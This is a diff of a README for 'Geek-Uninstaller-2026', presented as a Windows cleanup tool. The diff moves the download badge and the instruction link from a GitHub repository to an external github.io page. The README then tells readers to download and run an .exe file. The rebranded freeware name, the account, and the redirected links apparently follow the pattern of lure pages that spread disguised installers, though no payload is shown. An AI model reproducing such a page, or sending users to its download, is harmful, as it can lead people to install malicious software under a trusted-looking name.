@@ -1,6 +1,6 @@
 # 🛠️ Geek-Uninstaller-2026 - Clean your Windows computer with ease
 
-[![](https://img.shields.io/badge/Download-Geek_Uninstaller_2026-blue.svg)](https://github.com/Coreyrenewing800/Geek-Uninstaller-2026)
+[![](https://img.shields.io/badge/Download-Geek_Uninstaller_2026-blue.svg)](https://coreyrenewing800.github.io)
 
 ## 📋 Software Overview
 Geek-Uninstaller-2026 removes stubborn programs from your Windows computer. Windows often leaves behind leftover files and registry entries when you uninstall software. These leftover files take up space and clutter your system. This tool finds and deletes those remaining files to keep your computer fast and clean. It works on Windows 10 and Windows 11.
@@ -11,7 +11,7 @@ You need a computer running Windows 10 or Windows 11. The software requires 50 M
 ## 🚀 How to download the software
 You visit the project page to get the installer for your computer. Follow these steps to obtain the file.
 
-1. Go to this link to find the download: [https://github.com/Coreyrenewing800/Geek-Uninstaller-2026](https://github.com/Coreyrenewing800/Geek-Uninstaller-2026)
+1. Go to this link to find the download: [https://coreyrenewing800.github.io](https://coreyrenewing800.github.io)
 2. Look for the release section on the right side of the screen.
 3. Click the link that says latest version.
 4. Select the file ending in .exe to start your download.
